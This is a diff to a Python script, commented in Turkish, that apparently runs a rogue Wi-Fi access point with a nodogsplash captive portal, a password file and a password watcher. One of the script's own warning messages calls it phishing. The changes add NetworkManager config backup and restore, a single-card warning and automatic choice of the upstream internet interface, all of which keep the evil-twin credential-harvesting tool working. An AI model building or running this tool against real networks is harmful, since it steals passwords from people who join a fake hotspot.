@@ -13,6 +13,7 @@ GREEN, RED, YELLOW, CYAN, NC = '\033[0;32m', '\033[0;31m', '\033[1;33m', '\033[0
 LOG_FILE = "gsb_activity.log"
 PASS_FILE = "/etc/nodogsplash/passwords.txt"
 NDS_CONFIG = "/etc/nodogsplash/nodogsplash.conf"
+NM_CONF = "/etc/NetworkManager/NetworkManager.conf"
 
 # --- DINAMIK YOLLAR ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -22,6 +23,7 @@ LOGGER_PATH = os.path.join(NDS_HTDOCS, "backend/logger.py")
 
 print_lock = threading.Lock()
 active_clients = set() 
+INTERFACE = ""
 
 # --- BAĞIMLILIKLAR ---
 REQUIRED_PACKAGES = ["create_ap", "nodogsplash", "dnsmasq", "python3", "fuser", "iw"]
@@ -143,6 +145,14 @@ def clean_exit(sig, frame):
     subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
     
+    if os.path.exists(NM_CONF):
+        subprocess.run(["sudo", "sed", "-i", "/unmanaged-devices/d", NM_CONF], stdout=DEVNULL, stderr=DEVNULL)
+        if os.path.exists(NM_CONF + ".bak"):
+            subprocess.run(["sudo", "mv", NM_CONF + ".bak", NM_CONF], stdout=DEVNULL, stderr=DEVNULL)
+        if INTERFACE:
+            subprocess.run(["sudo", "nmcli", "dev", "set", INTERFACE, "managed", "yes"], stdout=DEVNULL, stderr=DEVNULL)
+        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=DEVNULL, stderr=DEVNULL)
+
     subprocess.run(["sudo", "rm", "-rf", NDS_HTDOCS], stdout=DEVNULL, stderr=DEVNULL)
     if os.path.exists(NDS_CONFIG + ".bak"):
         subprocess.run(["sudo", "mv", NDS_CONFIG + ".bak", NDS_CONFIG], stdout=DEVNULL, stderr=DEVNULL)
@@ -179,7 +189,12 @@ def password_watcher():
             safe_print(f"{CYAN}----------------------------------------------{NC}")
 
 def run():
+    global INTERFACE
     check_dependencies()
+    
+    if os.path.exists(NM_CONF) and not os.path.exists(NM_CONF + ".bak"):
+        subprocess.run(["sudo", "cp", NM_CONF, NM_CONF + ".bak"], stderr=subprocess.DEVNULL)
+        
     setup_portal_files()
     
     ifaces = get_interfaces()
@@ -196,17 +211,40 @@ def run():
         if not ifaces: 
             print(f"{RED}[!] Wi-Fi kartı bulunamadı!{NC}")
             return
+        # --- TEK KART UYARISI ---
+        if len(ifaces) == 1:
+            print(f"{RED}[!] Uyarı: Bu script düzgün çalışabilmek için harici bir karta ihtiyaç duymaktadır, sisteminizde sadece 1 adet yayın yapabilir kart algılandı. Devam edebilirsiniz ancak bu, client cihazların \"internet yok\" hatasıyla karşılaşmasına ve phishingin çalışmamasına sebebiyet verebilir.{NC}")
+
         for i, iface in enumerate(ifaces): print(f"  {i+1}) {iface}")
         idx1 = int(input("Yayın Kartı Seçin: ")) - 1
         INTERFACE = ifaces[idx1]
 
     setup_nds_config(INTERFACE)
 
+    # --- OTOMATİK İNTERNET KAYNAĞI SEÇİMİ ---
     INTERNET_INT = "lo"
+    blacklist = ["wg", "veth", "docker", "br-", "tun"]
+    
+    valid_ifaces = []
     for iface in all_sys_ifaces:
-        if iface != INTERFACE and iface != "lo" and not iface.startswith("veth"):
-            INTERNET_INT = iface
-            break
+        if iface != INTERFACE and iface != "lo":
+            if not any(iface.startswith(prefix) for prefix in blacklist):
+                valid_ifaces.append(iface)
+
+    if valid_ifaces:
+        for v_iface in valid_ifaces:
+            if v_iface.startswith("wl"):
+                INTERNET_INT = v_iface
+                break
+        
+        if INTERNET_INT == "lo":
+            for v_iface in valid_ifaces:
+                if any(v_iface.startswith(p) for p in ["en", "eth"]):
+                    INTERNET_INT = v_iface
+                    break
+        
+        if INTERNET_INT == "lo":
+            INTERNET_INT = valid_ifaces[0]
 
     safe_print(f"[*] SSID  : {GREEN}{args.ssid}{NC}")
     safe_print(f"[*] Yayın : {GREEN}{INTERFACE}{NC}")
@@ -237,7 +275,7 @@ def run():
             if any(x in line.lower() for x in ["disconn", "disassoc", "deauth", "expired", "removed"]):
                 if mac in active_clients:
                     active_clients.remove(mac)
-                    safe_print(f"{RED}[-] BAĞLANTI KESİLDİ: {mac}{NC}")
+                    safe_print(f"{RED}[- ] BAĞLANTI KESİLDİ: {mac}{NC}")
             elif any(x in line.lower() for x in ["assoc", "auth", "connected", "dhcpack"]):
                 if "dis" not in line.lower() and mac not in active_clients:
                     active_clients.add(mac)
